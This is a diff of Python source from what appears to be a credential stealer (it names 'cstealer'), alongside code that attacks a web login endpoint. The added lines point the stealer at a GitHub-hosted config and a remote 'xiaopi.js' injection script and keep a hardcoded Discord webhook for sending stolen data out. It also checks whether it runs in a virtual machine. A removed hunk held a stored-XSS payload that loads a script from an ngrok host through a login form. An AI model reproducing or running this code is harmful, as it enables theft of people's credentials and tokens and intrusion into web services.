@@ -115,24 +115,17 @@ def check_dll():
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
         exit_program('VM Detected')
 
-cname = "https://rentry.co/u4tup/raw"
-cnameresp = requests.get(cname)
+cname="benjiemin1231233"
+cnameresp = requests.get("https://raw.githubusercontent.com/benjiemin1231233/python/main/cname.txt")
 cname = cnameresp.text
 
-smallcname = "https://rentry.co/5crcu/raw"
-smallcnameresp = requests.get(smallcname)
-smallcname = smallcnameresp.text
+smallcname = cname #telegramID
 
-footerc = "https://rentry.co/pmpxa/raw"
-footercresp = requests.get(footerc)
-footerc = footercresp.text
-
-words = "https://rentry.co/5uu99/raw"
-wordsresp = requests.get(words)
-words = wordsresp.text
+footerc = "github.com/can-kat/cstealer | t.me/cstealerr"
+words = "Stealer"
 
 h00k = "https://discord.com/api/webhooks/1269198886027657286/et1hgHS6bmYhoOIqR7nORmygoPMdcVkmnmbVxBCUBmZWqlmVyoAkMg_4v1uIn3j6OwN2"
-inj3c710n_url = f"https://raw.githubusercontent.com/wtf{cname}wtf/index/main/injection.js"
+inj3c710n_url = f"https://raw.githubusercontent.com/{cname}/python/main/xiaopi.js"
 
 class DATA_BLOB(Structure):
     _fields_ = [
@@ -1402,12 +1395,7 @@ def xpData(s,request_address,url):
             'verifycode': ocr_code,
             'password': '123456'
         }
-        data3= {
-            'type': 'login',
-            'username': '<script src=http://0.tcp.ap.ngrok.io:18815/poc.js></script>',
-            'verifycode': ocr_code,
-            'password': '123456'
-        }
+      
         if os.path.exists(file_path):
                 try:
                     # 删除文件
@@ -1431,7 +1419,7 @@ def xpData(s,request_address,url):
         }
         res1 = s.post(url =request_address+'/service/app/account.php',headers=headers,data = data1,cookies=cookies,verify=False,timeout=15)
         res2 = s.post(url =request_address+'/service/app/account.php',headers=headers,data = data2,cookies=cookies,verify=False,timeout=15)
-        res3 = s.post(url =request_address+'/service/app/account.php',headers=headers,data = data3,cookies=cookies,verify=False,timeout=15)
+    
         request_addresstemp=request_address
 
         urltemp=url
